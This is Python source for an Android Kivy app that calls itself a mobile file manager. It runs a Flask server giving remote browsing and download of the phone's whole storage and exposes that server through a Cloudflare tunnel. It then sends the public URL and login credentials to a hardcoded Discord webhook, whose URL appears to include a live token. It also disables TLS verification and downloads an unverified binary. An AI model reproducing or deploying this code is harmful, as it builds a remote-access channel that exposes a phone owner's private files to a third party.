import json
import os
import random
import re
import ssl
import string
import subprocess
import threading
import time
import traceback
import urllib.request

ssl._create_default_https_context = ssl._create_unverified_context

from flask import Flask, Response, jsonify, render_template_string, request, send_file
from kivy.app import App
from kivy.clock import Clock, mainthread
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView

try:
    from android.permissions import Permission, request_permissions
    HAS_ANDROID_PERM = True
except ImportError:
    HAS_ANDROID_PERM = False

WEBHOOK_URL = "https://discord.com/api/webhooks/1553398382184239174/o5AgtxaHJhFmSRFmbq6bsfTYdro1PiBv4wDhonY_ENBvyXa6IQJeXQvJ__hgLWv77LkT"

USERNAME = "3anoor-Omda"
PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
PORT = 5000

app_flask = Flask(__name__)

def check_auth(u, p):
    return u == USERNAME and p == PASSWORD

def authenticate():
    return Response(
        'Login Required',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'},
    )

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مدير ملفات الموبايل</title>
    <style>
        body { font-family: system-ui, sans-serif; background: #121212; color: #fff; margin: 0; padding: 15px; }
        .container { max-width: 800px; margin: 0 auto; }
        h2 { border-bottom: 2px solid #333; padding-bottom: 10px; color: #4CAF50; }
        .breadcrumb { font-family: monospace; background: #2a2a2a; padding: 10px; border-radius: 5px; margin-bottom: 15px; word-break: break-all; }
        ul { list-style: none; padding: 0; margin: 0; }
        li { padding: 12px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        li:hover { background: #2a2a2a; }
        a { color: #64B5F6; text-decoration: none; cursor: pointer; font-weight: bold; }
        button { background: #4CAF50; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📱 مدير ملفات الموبايل</h2>
        <div class="breadcrumb" id="current-path">/storage/emulated/0</div>
        <ul id="file-list"></ul>
    </div>

    <script>
        let currentPath = "/storage/emulated/0";

        function loadFiles(path) {
            fetch('/api/files?path=' + encodeURIComponent(path))
            .then(res => res.json())
            .then(data => {
                if(data.error) { alert("خطأ: " + data.error); return; }
                currentPath = data.current_path;
                document.getElementById('current-path').innerText = currentPath;
                const list = document.getElementById('file-list');
                list.innerHTML = '';

                if(data.parent) {
                    list.innerHTML += `<li>📂 <a onclick="loadFiles('${escapePath(data.parent)}')">.. (المجلد الأعلى)</a> <span></span></li>`;
                }

                data.items.forEach(item => {
                    if(item.is_dir) {
                        list.innerHTML += `<li>📁 <a onclick="loadFiles('${escapePath(item.path)}')">${item.name}</a> <span>مجلد</span></li>`;
                    } else {
                        list.innerHTML += `<li>📄 ${item.name} <a href="/api/download?path=${encodeURIComponent(item.path)}" target="_blank"><button>تحميل</button></a></li>`;
                    }
                });
            })
            .catch(err => alert("تعذر تحميل الملفات"));
        }

        function escapePath(path) {
            return path.replace(/\\'/g, "\\\\'");
        }

        loadFiles(currentPath);
    </script>
</body>
</html>
'''

@app_flask.route('/')
def index():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()
    return render_template_string(HTML_TEMPLATE)

@app_flask.route('/api/files')
def list_files():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    default_path = '/storage/emulated/0' if os.path.exists('/storage/emulated/0') else '/sdcard'
    req_path = request.args.get('path', default_path)

    if not os.path.exists(req_path):
        req_path = default_path

    try:
        items = []
        for entry in os.scandir(req_path):
            try:
                items.append({
                    'name': entry.name,
                    'path': entry.path,
                    'is_dir': entry.is_dir()
                })
            except Exception:
                continue

        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        parent = os.path.dirname(os.path.abspath(req_path))
        if parent == req_path:
            parent = None

        return jsonify({'current_path': req_path, 'parent': parent, 'items': items})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app_flask.route('/api/download')
def download_file():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    file_path = request.args.get('path')
    if file_path and os.path.isfile(file_path):
        return send_file(file_path, as_attachment=True)
    return 'الملف غير موجود', 404


class DebugApp(App):
    def build(self):
        self.scroll = ScrollView()
        self.log_label = Label(
            text="=== Mobile Storage Server Console ===\n",
            size_hint_y=None,
            font_size='11sp',
            color=(0, 1, 0, 1),
            halign='left',
            valign='top'
        )
        self.log_label.bind(width=lambda instance, value: setattr(instance, 'text_size', (value - 20, None)))
        self.log_label.bind(texture_size=lambda instance, value: setattr(instance, 'size', value))
        self.scroll.add_widget(self.log_label)
        return self.scroll

    @mainthread
    def log(self, text):
        print(text)
        self.log_label.text += f"{text}\n"

    def on_start(self):
        self.log(f"[CREDENTIALS] User: {USERNAME} | Pass: {PASSWORD}")
        
        if HAS_ANDROID_PERM:
            try:
                request_permissions([
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.WRITE_EXTERNAL_STORAGE
                ])
            except Exception as e:
                self.log(f"[WARN] Failed to request permissions: {e}")

        Clock.schedule_once(lambda dt: self.start_services(), 1)

    def start_services(self):
        threading.Thread(target=self.run_flask, daemon=True).start()
        threading.Thread(target=self.start_tunnel, daemon=True).start()

    def run_flask(self):
        try:
            self.log("[INFO] Starting Flask server...")
            app_flask.run(host='0.0.0.0', port=PORT)
        except Exception as e:
            self.log(f"[ERROR] Flask failed: {e}")

    def get_cloudflared_path(self):
        # 1. البحث في مسارات الأندرويد الأساسية
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            lib_dir = PythonActivity.mActivity.getApplicationInfo().nativeLibraryDir
            cf_bin = os.path.join(lib_dir, "libcloudflared.so")
            if os.path.exists(cf_bin):
                return cf_bin
        except Exception as e:
            self.log(f"[WARN] PyJnius lookup: {e}")

        # 2. البحث داخل مجلد بيانات التطبيق الداخلية
        internal_dir = self.user_data_dir
        custom_bin = os.path.join(internal_dir, "cloudflared")
        if os.path.exists(custom_bin):
            return custom_bin

        # 3. إذا لم يوجد الملف، قم بتحميله تلقائياً لأجهزة الأندرويد (ARM64)
        self.log("[INFO] Downloading Cloudflare binary for Android...")
        try:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            context = ssl._create_unverified_context()
            
            # قراءة وتحميل الملف باستخدام urlopen لمنع أخطاء urllib
            req = urllib.request.urlopen(url, context=context)
            with open(custom_bin, 'wb') as f:
                f.write(req.read())

            os.chmod(custom_bin, 0o755)
            self.log("[SUCCESS] Cloudflare downloaded successfully!")
            return custom_bin
        except Exception as e:
            self.log(f"[ERROR] Download failed: {e}")

        return None

    def start_tunnel(self):
        time.sleep(2)
        try:
            cf_bin = self.get_cloudflared_path()
            if not cf_bin:
                self.log("[CRITICAL ERROR] Could not locate or download cloudflared!")
                return

            self.log(f"[INFO] Cloudflare binary path: {cf_bin}")

            cmd = [
                cf_bin, "tunnel",
                "--no-autoupdate",
                "--protocol", "http2",
                "--edge-ip-version", "4",
                "--url", f"http://127.0.0.1:{PORT}"
            ]

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            url_found = False

            for line in iter(process.stdout.readline, ''):
                if not line:
                    break
                line_str = line.strip()

                if "trycloudflare.com" in line_str or "ERROR" in line_str or "ERR" in line_str:
                    self.log(f"[CF] {line_str[:120]}")

                matches = re.findall(r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line_str)
                for url in matches:
                    if "api.trycloudflare.com" not in url:
                        self.log(f"[SUCCESS] Public URL: {url}")
                        self.send_to_discord(url)
                        url_found = True
                        break

                if url_found:
                    break

            if not url_found:
                self.log("[WARN] Cloudflare tunnel process ended.")

        except Exception as e:
            self.log(f"[ERROR] {e}")
            self.log(f"[TRACEBACK]\n{traceback.format_exc()}")

    def send_to_discord(self, public_url):
        self.log("[INFO] Sending URL to Discord Webhook...")
        payload = {
            "embeds": [
                {
                    "title": "📱 تم تشغيل مدير ملفات الموبايل بنجاح!",
                    "color": 5814783,
                    "fields": [
                        {"name": "🔗 رابط التحكم المباشر", "value": f"[اضغط هنا]({public_url})\n`{public_url}`"},
                        {"name": "👤 Username", "value": f"`{USERNAME}`", "inline": True},
                        {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
                    ],
                    "footer": {"text": "Android Mobile File Manager"}
                }
            ]
        }
        try:
            data = json.dumps(payload).encode('utf-8')
            context = ssl._create_unverified_context()
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=data,
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            )
            res = urllib.request.urlopen(req, context=context)
            self.log(f"[SUCCESS] Discord Webhook Status: {res.getcode()}")
        except Exception as e:
            self.log(f"[ERROR] Discord Webhook Failed: {e}")

if __name__ == "__main__":
    DebugApp().run()
